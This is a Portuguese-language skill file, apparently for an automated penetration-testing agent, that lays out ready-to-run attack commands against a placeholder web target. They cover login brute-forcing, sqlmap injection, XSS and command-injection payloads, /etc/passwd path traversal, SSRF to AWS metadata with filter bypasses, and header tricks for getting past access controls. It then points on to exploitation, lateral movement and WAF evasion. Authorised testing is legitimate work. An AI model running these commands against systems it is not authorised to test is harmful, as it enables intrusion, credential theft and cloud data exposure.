---
name: owasp_top10_manual_test
phase: 3_vulnerability_analysis
tools: [curl, ffuf, sqlmap, nikto, nuclei]
dependencies: [web_service_found]
mitre_tactic: TA0043 (Reconnaissance)
---

# Objetivo
Realizar testes manuais e semi-automatizados para as vulnerabilidades do OWASP Top 10 2021, cobrindo:
A01 (Broken Access Control), A02 (Cryptographic Failures), A03 (Injection), A07 (Identification and Authentication Failures) e A10 (Server-Side Request Forgery - SSRF).

# Condicoes de Execucao
- Um servico web foi identificado e esta acessivel.
- A URL base do alvo e conhecida.
- Pelo menos uma wordlist esta disponivel para fuzzing.

# Comandos e Sintaxe

## 1. Scan Geral com Nikto
```bash
nikto -h {target} -output {workspace}/nikto_owasp.txt -Format txt 2>&1 | tee {workspace}/nikto_owasp_raw.txt
```

## 2. Nuclei - Templates OWASP
```bash
nuclei -u {target} -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -severity critical,high,medium -o {workspace}/nuclei_owasp.txt 2>&1 | tee {workspace}/nuclei_owasp_raw.txt
```

```bash
nuclei -u {target} -tags owasp,sqli,xss,ssrf,lfi,rfi,rce,auth-bypass -o {workspace}/nuclei_owasp_tags.txt 2>&1 | tee {workspace}/nuclei_owasp_tags_raw.txt
```

## 3. A01 - Broken Access Control

### IDOR - Iteracao de IDs
```bash
curl -s -o /dev/null -w "%{http_code}" -H "Cookie: {session_cookie}" "{target}/api/users/1"
curl -s -o /dev/null -w "%{http_code}" -H "Cookie: {session_cookie}" "{target}/api/users/2"
```

### Forced Browsing com ffuf
```bash
ffuf -u {target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -o {workspace}/ffuf_access_control.json 2>&1 | tee {workspace}/ffuf_access_control.txt
```

### Bypass de Controle de Acesso via Metodo HTTP
```bash
curl -s -o /dev/null -w "%{http_code}" -X GET "{target}/admin"
curl -s -o /dev/null -w "%{http_code}" -X POST "{target}/admin"
curl -s -o /dev/null -w "%{http_code}" -X PUT "{target}/admin"
curl -s -o /dev/null -w "%{http_code}" -X OPTIONS "{target}/admin"
```

### Bypass com Headers
```bash
curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: /admin" "{target}/"
curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" "{target}/admin"
curl -s -o /dev/null -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" "{target}/admin"
```

## 4. A02 - Cryptographic Failures

### Verificar headers de seguranca
```bash
curl -sI {target} | grep -iE "strict-transport|content-security-policy|x-frame-options|x-content-type|set-cookie" | tee {workspace}/security_headers.txt
```

### Buscar dados sensiveis em respostas
```bash
curl -s {target} | grep -iE "password|secret|api[_-]?key|token|credit.?card|ssn|cpf" | tee {workspace}/sensitive_data_leak.txt
```

### Buscar endpoints com dados expostos
```bash
ffuf -u {target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200 -o {workspace}/ffuf_sensitive_endpoints.json 2>&1 | tee {workspace}/ffuf_sensitive_endpoints.txt
```

## 5. A03 - Injection

### SQL Injection com sqlmap
```bash
sqlmap -u "{target}/?id=1" --batch --random-agent --level 3 --risk 2 --forms --crawl=3 --output-dir={workspace}/sqlmap_owasp/ 2>&1 | tee {workspace}/sqlmap_owasp_scan.txt
```

### XSS - Teste manual com curl
```bash
curl -s "{target}/search?q=<script>alert(1)</script>" -o {workspace}/xss_test_reflected.html
curl -s '{target}/search?q="><img src=x onerror=alert(1)>' -o {workspace}/xss_test_img.html
```

### Command Injection
```bash
curl -s "{target}/ping?host=127.0.0.1;id" | tee {workspace}/cmdi_test_semicolon.txt
curl -s "{target}/ping?host=127.0.0.1|id" | tee {workspace}/cmdi_test_pipe.txt
```

### LFI / Path Traversal
```bash
curl -s "{target}/page?file=../../../../etc/passwd" | tee {workspace}/lfi_test_passwd.txt
curl -s "{target}/page?file=....//....//....//etc/passwd" | tee {workspace}/lfi_test_bypass.txt
```

## 6. A07 - Identification and Authentication Failures

### Brute-force com ffuf em login
```bash
ffuf -u {target}/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt -H "Content-Type: application/x-www-form-urlencoded" -mc 200,302 -fr "Invalid" -o {workspace}/ffuf_bruteforce.json 2>&1 | tee {workspace}/ffuf_bruteforce.txt
```

### Teste de enumeracao de usuarios
```bash
curl -s -X POST "{target}/login" -d "username=admin&password=wrong" -H "Content-Type: application/x-www-form-urlencoded" | tee {workspace}/user_enum_admin.txt
curl -s -X POST "{target}/login" -d "username=nonexistent12345&password=wrong" -H "Content-Type: application/x-www-form-urlencoded" | tee {workspace}/user_enum_fake.txt
```

### Teste de tokens previsiveis
```bash
curl -s -c - "{target}/login" -X POST -d "username=admin&password={password}" | grep -i "set-cookie\|token\|session" | tee {workspace}/session_token_test.txt
```

## 7. A10 - Server-Side Request Forgery (SSRF)

### SSRF basico
```bash
curl -s "{target}/fetch?url=http://127.0.0.1:80" | tee {workspace}/ssrf_localhost.txt
curl -s "{target}/fetch?url=http://169.254.169.254/latest/meta-data/" | tee {workspace}/ssrf_aws_metadata.txt
curl -s "{target}/fetch?url=http://[::1]:80" | tee {workspace}/ssrf_ipv6_localhost.txt
```

### SSRF com bypass de filtros
```bash
curl -s "{target}/fetch?url=http://0x7f000001:80" | tee {workspace}/ssrf_hex.txt
curl -s "{target}/fetch?url=http://2130706433:80" | tee {workspace}/ssrf_decimal.txt
curl -s "{target}/fetch?url=http://localhost.localtest.me" | tee {workspace}/ssrf_dns_rebind.txt
```

### Nuclei SSRF templates
```bash
nuclei -u {target} -tags ssrf -o {workspace}/nuclei_ssrf.txt 2>&1 | tee {workspace}/nuclei_ssrf_raw.txt
```

# Analise de Resultados
- **A01:** Se endpoints administrativos retornarem 200 sem autenticacao, ha Broken Access Control confirmado.
- **A02:** Ausencia de `Strict-Transport-Security`, `Content-Security-Policy`, ou cookies sem flags `Secure`/`HttpOnly` indicam falhas criptograficas.
- **A03:** Se `sqlmap` encontrar injecao ou se payloads de XSS/LFI/Command Injection retornarem dados inesperados, acione skills de exploracao correspondentes.
- **A07:** Se ffuf encontrar credenciais validas ou se respostas diferem entre usuarios existentes e inexistentes, ha falha de autenticacao.
- **A10:** Se SSRF retornar conteudo interno (metadados AWS, paginas internas), e vulnerabilidade critica.

# Proximos Passos
- SQL Injection confirmado: acione `sql_injection_exploitation`.
- Upload encontrado: acione `file_upload_exploitation`.
- Credenciais obtidas: acione `bruteforce_authentication` ou `lateral_movement_psexec`.
- SSRF confirmado: aprofundar para leitura de arquivos internos, port scanning interno, ou acesso a servicos cloud.

# Tratamento de Erros
- Se `nikto` travar, reduza o timeout: `nikto -h {target} -timeout 5`.
- Se `ffuf` gerar muitos falsos positivos, filtre por tamanho: `-fs <tamanho_comum>`.
- Se `nuclei` nao encontrar templates, atualize: `nuclei -update-templates`.
- Se `sqlmap` nao detectar injecao, tente manualmente com payloads especificos por DBMS.
- Se o WAF bloquear requisicoes, adicione delays: `--rate-limit 10` no nuclei ou `-rate 50` no ffuf.
